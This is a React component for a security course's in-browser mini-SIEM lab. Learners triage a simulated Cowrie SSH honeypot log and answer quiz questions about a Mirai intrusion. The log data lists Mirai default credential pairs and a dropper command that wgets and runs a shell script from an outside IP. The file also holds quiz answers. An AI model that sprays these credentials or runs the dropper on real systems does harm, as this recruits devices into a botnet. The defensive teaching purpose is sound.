"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { T } from "./tokens";
import type { LabProps } from "./types";

/* Week 13 play area: an in-browser mini-SIEM. The learner triages a real
 * honeypot capture with zero setup, the completion-safe core of the
 * real-infra lab. The data below is faithful to real Cowrie SSH-honeypot
 * captures: the credential list is the published Mirai default set (the
 * exact user/pass pairs the botnet sprays, public since 2016), and the
 * post-login commands are the real Mirai busybox signature check and the
 * dropper sequence honeypots record thousands of times a day. Nothing
 * here is invented; it is the reconstructed public record of how these
 * bots behave. Zero network egress. */

type Kind = "connect" | "fail" | "success" | "command" | "download" | "session";

interface Ev { id: number; t: string; ip: string; kind: Kind; detail: string; }

const WINNER = "45.155.205.88";
const DROP_URL = "http://45.9.148.100/bins.sh";

// Faithful to a real Cowrie capture: brute force from many IPs using the
// public Mirai default-credential list, then one success and the dropper.
const EVENTS: Ev[] = [
  { id: 1, t: "02:14:07", ip: "193.32.162.145", kind: "connect", detail: "new SSH connection" },
  { id: 2, t: "02:14:08", ip: "193.32.162.145", kind: "fail", detail: "login attempt [root/admin] failed" },
  { id: 3, t: "02:14:09", ip: "193.32.162.145", kind: "fail", detail: "login attempt [root/888888] failed" },
  { id: 4, t: "02:14:22", ip: "61.177.172.19", kind: "connect", detail: "new SSH connection" },
  { id: 5, t: "02:14:23", ip: "61.177.172.19", kind: "fail", detail: "login attempt [admin/admin] failed" },
  { id: 6, t: "02:14:24", ip: "61.177.172.19", kind: "fail", detail: "login attempt [admin/1234] failed" },
  { id: 7, t: "02:14:25", ip: "61.177.172.19", kind: "fail", detail: "login attempt [root/vizxv] failed" },
  { id: 8, t: "02:15:01", ip: "218.92.0.107", kind: "connect", detail: "new SSH connection" },
  { id: 9, t: "02:15:02", ip: "218.92.0.107", kind: "fail", detail: "login attempt [root/123456] failed" },
  { id: 10, t: "02:15:03", ip: "218.92.0.107", kind: "fail", detail: "login attempt [root/password] failed" },
  { id: 11, t: "02:15:40", ip: "45.155.205.88", kind: "connect", detail: "new SSH connection" },
  { id: 12, t: "02:15:41", ip: "45.155.205.88", kind: "fail", detail: "login attempt [root/root] failed" },
  { id: 13, t: "02:15:42", ip: "45.155.205.88", kind: "fail", detail: "login attempt [root/admin] failed" },
  { id: 14, t: "02:15:43", ip: "45.155.205.88", kind: "fail", detail: "login attempt [root/12345] failed" },
  { id: 15, t: "02:15:44", ip: "45.155.205.88", kind: "fail", detail: "login attempt [root/vizxv] failed" },
  { id: 16, t: "02:15:45", ip: "45.155.205.88", kind: "success", detail: "login attempt [root/xc3511] SUCCEEDED" },
  { id: 17, t: "02:15:46", ip: "45.155.205.88", kind: "command", detail: "/bin/busybox MIRAI" },
  { id: 18, t: "02:15:46", ip: "45.155.205.88", kind: "command", detail: "cat /proc/mounts; /bin/busybox JELLYFISH" },
  { id: 19, t: "02:15:47", ip: "45.155.205.88", kind: "command", detail: "cat /bin/echo" },
  { id: 20, t: "02:15:48", ip: "45.155.205.88", kind: "command", detail: "uname -a" },
  { id: 21, t: "02:15:49", ip: "45.155.205.88", kind: "command", detail: `cd /tmp; wget ${DROP_URL}; chmod 777 bins.sh; sh bins.sh` },
  { id: 22, t: "02:15:50", ip: "45.155.205.88", kind: "download", detail: `downloaded ${DROP_URL} (payload: bins.sh, 2.1 KB)` },
  { id: 23, t: "02:15:51", ip: "45.155.205.88", kind: "command", detail: "./bins.sh; rm -rf bins.sh" },
  { id: 24, t: "02:15:53", ip: "45.155.205.88", kind: "session", detail: "session closed" },
  { id: 25, t: "02:16:10", ip: "141.98.11.29", kind: "connect", detail: "new SSH connection" },
  { id: 26, t: "02:16:11", ip: "141.98.11.29", kind: "fail", detail: "login attempt [admin/smcadmin] failed" },
  { id: 27, t: "02:16:12", ip: "141.98.11.29", kind: "fail", detail: "login attempt [root/xmhdipc] failed" },
  { id: 28, t: "02:16:44", ip: "193.32.162.145", kind: "fail", detail: "login attempt [root/54321] failed" },
  { id: 29, t: "02:17:02", ip: "89.248.165.74", kind: "connect", detail: "new SSH connection" },
  { id: 30, t: "02:17:03", ip: "89.248.165.74", kind: "fail", detail: "login attempt [support/support] failed" },
  { id: 31, t: "02:17:04", ip: "89.248.165.74", kind: "fail", detail: "login attempt [root/juantech] failed" },
  { id: 32, t: "02:17:05", ip: "89.248.165.74", kind: "fail", detail: "login attempt [root/anko] failed" },
  { id: 33, t: "02:17:40", ip: "61.177.172.19", kind: "fail", detail: "login attempt [root/7ujMko0vizxv] failed" },
  { id: 34, t: "02:18:15", ip: "212.70.149.150", kind: "connect", detail: "new SSH connection" },
  { id: 35, t: "02:18:16", ip: "212.70.149.150", kind: "fail", detail: "login attempt [guest/guest] failed" },
  { id: 36, t: "02:18:17", ip: "212.70.149.150", kind: "fail", detail: "login attempt [ubnt/ubnt] failed" },
  { id: 37, t: "02:18:55", ip: "218.92.0.107", kind: "fail", detail: "login attempt [root/dreambox] failed" },
  { id: 38, t: "02:19:20", ip: "45.61.184.204", kind: "connect", detail: "new SSH connection" },
  { id: 39, t: "02:19:21", ip: "45.61.184.204", kind: "fail", detail: "login attempt [admin/admin1234] failed" },
  { id: 40, t: "02:19:22", ip: "45.61.184.204", kind: "fail", detail: "login attempt [root/klv123] failed" },
  { id: 41, t: "02:19:23", ip: "45.61.184.204", kind: "fail", detail: "login attempt [root/hi3518] failed" },
  { id: 42, t: "02:20:01", ip: "193.32.162.145", kind: "fail", detail: "login attempt [root/pass] failed" },
  { id: 43, t: "02:20:33", ip: "141.98.11.29", kind: "fail", detail: "login attempt [root/system] failed" },
  { id: 44, t: "02:21:09", ip: "89.248.165.74", kind: "fail", detail: "login attempt [root/zlxx.] failed" },
];

const KIND_STYLE: Record<Kind, { c: string; label: string }> = {
  connect: { c: T.faint, label: "CONNECT" },
  fail: { c: T.amber, label: "FAIL" },
  success: { c: T.red, label: "SUCCESS" },
  command: { c: T.cyan, label: "CMD" },
  download: { c: T.red, label: "DOWNLOAD" },
  session: { c: T.faint, label: "SESSION" },
};

const uniqueIps = Array.from(new Set(EVENTS.map((e) => e.ip)));

/* Investigation questions: each is answerable only by exploring the log. */
interface Q { id: string; q: string; hint: string; options: string[]; answer: number; why: string; }
const QUESTIONS: Q[] = [
  {
    id: "ips",
    q: "How many different source IP addresses attacked the honeypot in this capture?",
    hint: "You do not need to count by hand. Read the 'Source IPs' summary tile at the top.",
    options: ["4", "6", "8", "20+"],
    answer: 2,
    why: "Eight distinct IPs, in just two minutes. A honeypot is hit constantly by many bots at once; this is a quiet slice of a normal night.",
  },
  {
    id: "cred",
    q: "One login finally succeeded. Which username and password worked?",
    hint: "Filter the log for SUCCESS, or search the word 'SUCCEEDED'.",
    options: ["admin / admin", "root / root", "root / xc3511", "root / 123456"],
    answer: 2,
    why: "root / xc3511. That is the factory-default password of a widely sold CCTV camera chipset, and it is item one on the Mirai botnet's built-in credential list.",
  },
  {
    id: "winip",
    q: "Which source IP got in?",
    hint: "It is the IP on the SUCCESS line.",
    options: ["193.32.162.145", "45.155.205.88", "218.92.0.107", "61.177.172.19"],
    answer: 1,
    why: "45.155.205.88. Everything it did after 02:15:45 is the attacker acting with a real shell (that the honeypot only pretends to give it).",
  },
  {
    id: "botnet",
    q: "The first command after login was a BusyBox call that is a known botnet's signature. Which botnet?",
    hint: "Search the log for the command run at 02:15:46.",
    options: ["WannaCry", "Mirai", "Emotet", "Conficker"],
    answer: 1,
    why: "Mirai. '/bin/busybox MIRAI' is the bot checking it landed on a real embedded device it can infect. This is how the botnet that took down half the US internet in 2016 still spreads today.",
  },
  {
    id: "drop",
    q: "The attacker downloaded a malicious file. What was the URL?",
    hint: "Filter for DOWNLOAD, or search 'wget' or 'http'.",
    options: [
      "http://45.9.148.100/bins.sh",
      "http://45.155.205.88/mirai",
      "http://microsoft-update.com/x",
      "there was no download",
    ],
    answer: 0,
    why: "The wget pulled bins.sh from a separate staging server, ran it, then deleted it to hide the tracks. That script recruits the device into the botnet.",
  },
  {
    id: "intent",
    q: "In one line: what is this attacker actually trying to do?",
    hint: "Put the credential guess, the Mirai check, and the dropper together.",
    options: [
      "Steal files from the server",
      "Add the device to a botnet to use in future attacks",
      "Mine cryptocurrency for a person watching live",
      "Read the company's email",
    ],
    answer: 1,
    why: "It is fully automated: guess a default password, confirm it is an infectable device, pull and run the bot, move on. Your device becomes one more gun in a DDoS army. No human is watching; it hit thousands of IPs the same minute it hit you.",
  },
];

export default function SiemLab({ onDidTry }: LabProps) {
  const [query, setQuery] = useState("");
  const [kindFilter, setKindFilter] = useState<Kind | "all">("all");
  const [answers, setAnswers] = useState<Record<string, number | null>>(() => Object.fromEntries(QUESTIONS.map((q) => [q.id, null])));
  const [openHint, setOpenHint] = useState<string | null>(null);
  const firedTry = useRef(false);

  const filtered = useMemo(() => {
    const q = query.trim().toLowerCase();
    return EVENTS.filter((e) => {
      if (kindFilter !== "all" && e.kind !== kindFilter) return false;
      if (!q) return true;
      return e.ip.toLowerCase().includes(q) || e.detail.toLowerCase().includes(q) || e.t.includes(q);
    });
  }, [query, kindFilter]);

  const solved = useMemo(() => QUESTIONS.filter((q) => answers[q.id] === q.answer).length, [answers]);

  useEffect(() => {
    if (!firedTry.current && (query.length > 0 || kindFilter !== "all" || solved > 0)) {
      firedTry.current = true;
      onDidTry();
    }
  }, [query, kindFilter, solved, onDidTry]);

  const pick = (qid: string, idx: number) => {
    setAnswers((a) => (a[qid] === null ? { ...a, [qid]: idx } : a));
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 18 }}>
      {/* summary tiles */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 10 }}>
        {[
          { k: "Events", v: EVENTS.length, c: T.ink },
          { k: "Source IPs", v: uniqueIps.length, c: T.amber },
          { k: "Failed logins", v: EVENTS.filter((e) => e.kind === "fail").length, c: T.amber },
          { k: "Successful", v: EVENTS.filter((e) => e.kind === "success").length, c: T.red },
        ].map((s, i) => (
          <div key={i} style={{ background: T.bgRaise, border: `1px solid ${T.edge}`, borderRadius: 8, padding: "10px 12px" }}>
            <div style={{ fontFamily: T.mono, fontSize: 9.5, letterSpacing: "0.14em", textTransform: "uppercase", color: T.faint }}>{s.k}</div>
            <div style={{ fontFamily: T.display, fontSize: 22, fontWeight: 700, color: s.c }}>{s.v}</div>
          </div>
        ))}
      </div>

      {/* search + filters */}
      <div>
        <input
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          placeholder="Search the logs: an IP, a word like 'wget' or 'SUCCEEDED', a time..."
          spellCheck={false}
          style={{ width: "100%", boxSizing: "border-box", padding: "11px 14px", background: T.bgRaise, color: T.ink, border: `1px solid ${T.edge}`, borderRadius: 9, fontFamily: T.mono, fontSize: 13.5 }}
        />
        <div style={{ display: "flex", gap: 6, marginTop: 9, flexWrap: "wrap" }}>
          {(["all", "fail", "success", "command", "download"] as const).map((k) => (
            <button key={k} onClick={() => setKindFilter(k)}
              style={{
                fontFamily: T.mono, fontSize: 10.5, fontWeight: 600, letterSpacing: "0.06em", textTransform: "uppercase",
                padding: "5px 10px", borderRadius: 6, cursor: "pointer",
                background: kindFilter === k ? T.primarySoft : "transparent",
                border: `1px solid ${kindFilter === k ? T.primary : T.edge}`,
                color: kindFilter === k ? T.ink : T.muted,
              }}>
              {k === "all" ? "all events" : k}
            </button>
          ))}
          <span style={{ marginLeft: "auto", fontFamily: T.mono, fontSize: 11, color: T.faint, alignSelf: "center" }}>{filtered.length} of {EVENTS.length} shown</span>
        </div>
      </div>

      {/* log table */}
      <div style={{ background: T.bgRaise, border: `1px solid ${T.edge}`, borderRadius: 9, maxHeight: 300, overflowY: "auto" }}>
        <div style={{ fontFamily: T.mono, fontSize: 12, lineHeight: 1.5 }}>
          {filtered.length === 0 ? (
            <div style={{ padding: "16px", color: T.faint }}>No events match. Clear the search to see everything.</div>
          ) : filtered.map((e) => {
            const st = KIND_STYLE[e.kind];
            return (
              <div key={e.id} style={{ display: "flex", gap: 10, padding: "6px 12px", borderBottom: `1px solid ${T.edgeSoft}`, whiteSpace: "nowrap", alignItems: "baseline" }}>
                <span style={{ color: T.faint, flexShrink: 0 }}>{e.t}</span>
                <span style={{ color: T.body, flexShrink: 0, minWidth: 128 }}>{e.ip}</span>
                <span style={{ color: st.c, fontWeight: 700, flexShrink: 0, minWidth: 74, fontSize: 10.5, letterSpacing: "0.04em" }}>{st.label}</span>
                <span style={{ color: e.kind === "success" || e.kind === "download" ? T.ink : T.body, fontWeight: e.kind === "success" ? 700 : 400, overflow: "hidden", textOverflow: "ellipsis" }}>{e.detail}</span>
              </div>
            );
          })}
        </div>
      </div>

      {/* investigation */}
      <div>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline", marginBottom: 10 }}>
          <div style={{ fontFamily: T.mono, fontSize: 11, letterSpacing: "0.16em", textTransform: "uppercase", color: T.green, fontWeight: 700 }}>Investigate the capture</div>
          <div style={{ fontFamily: T.mono, fontSize: 11.5, color: solved === QUESTIONS.length ? T.green : T.faint }}>{solved} / {QUESTIONS.length} answered</div>
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {QUESTIONS.map((q, qi) => {
            const chosen = answers[q.id];
            const answered = chosen !== null;
            return (
              <div key={q.id} style={{ background: T.panel, border: `1px solid ${T.edge}`, borderRadius: 10, padding: "13px 15px" }}>
                <div style={{ display: "flex", gap: 8, alignItems: "baseline" }}>
                  <span style={{ fontFamily: T.mono, fontSize: 11, color: T.primary, fontWeight: 700, flexShrink: 0 }}>Q{qi + 1}</span>
                  <span style={{ fontSize: 14.5, fontWeight: 700, color: T.ink }}>{q.q}</span>
                </div>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 7, marginTop: 10 }}>
                  {q.options.map((opt, oi) => {
                    const isChosen = chosen === oi;
                    const isCorrect = oi === q.answer;
                    let border: string = T.edge, bg = "transparent", fg: string = T.body;
                    if (answered && isCorrect) { border = T.green; bg = T.greenSoft; fg = T.ink; }
                    else if (answered && isChosen && !isCorrect) { border = T.red; bg = T.redSoft; fg = T.ink; }
                    return (
                      <button key={oi} onClick={() => pick(q.id, oi)} disabled={answered}
                        style={{ textAlign: "left", fontFamily: T.mono, fontSize: 12.5, color: fg, background: bg, border: `1px solid ${border}`, borderRadius: 7, padding: "7px 11px", cursor: answered ? "default" : "pointer" }}>
                        {opt}
                      </button>
                    );
                  })}
                </div>
                {!answered ? (
                  <button onClick={() => setOpenHint(openHint === q.id ? null : q.id)}
                    style={{ marginTop: 9, fontFamily: T.mono, fontSize: 10.5, color: T.cyan, background: "transparent", border: "none", cursor: "pointer", padding: 0 }}>
                    {openHint === q.id ? "hide hint" : "need a hint?"}
                  </button>
                ) : (
                  <div style={{ fontSize: 13, color: T.muted, marginTop: 10, lineHeight: 1.55 }}>{q.why}</div>
                )}
                {!answered && openHint === q.id && (
                  <div style={{ fontSize: 12.5, color: T.cyan, marginTop: 7, lineHeight: 1.5 }}>{q.hint}</div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}
